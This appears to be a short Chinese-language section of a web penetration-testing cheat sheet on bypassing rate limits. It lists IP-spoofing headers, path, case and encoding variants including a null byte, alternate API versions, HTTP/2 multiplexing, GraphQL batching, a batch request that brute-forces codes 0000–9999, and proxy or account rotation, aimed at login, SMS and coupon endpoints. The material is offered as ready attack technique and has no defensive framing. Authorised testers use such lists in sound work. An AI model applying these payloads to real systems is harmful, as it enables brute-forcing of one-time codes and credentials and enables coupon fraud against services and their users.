## 六、速率限制多维绕过

### 6.1 识别
```
- 429 Too Many Requests + Retry-After
- 不同IP/用户/端点不同限制
- 登录/短信/兑换码/优惠券接口重点限速
```

### 6.2 绕过技术（高级）
```http
# 1. 头轮换
X-Forwarded-For: 1.1.1.1
X-Original-Forwarded-For: 2.2.2.2
X-Real-IP: 3.3.3.3
X-Client-IP: 4.4.4.4
X-Remote-Addr: 5.5.5.5
X-Forwarded-Host / True-Client-IP / CF-Connecting-IP
Forwarded: for=6.6.6.6

# 2. 路径/大小写/尾斜杠/编码变体
/api/login /Api/Login /api/login/ /api/login?x=1 /api/%6cogin /api/login%00
# 多版本分流：/api/v1/login /v2/login /mobile/login /internal/login

# 3. 协议层
# HTTP/2多路复用（Turbo Intruder单连接并发）
# 分块传输chunked
# 连接复用：Keep-Alive多请求同连接（每连接计数陷阱）

# 4. 业务层
# GraphQL批量mutation（一次请求N操作）
# 批量数组端点 POST /api/verify {"codes":["0000"..."9999"]}
# 异步接口：提交任务ID轮询（绕过同步限速）

# 5. 分布式
# 代理池/负载均衡器后不同后端节点独立计数
# 多账号/多设备轮换（限速按用户不按IP时）
```

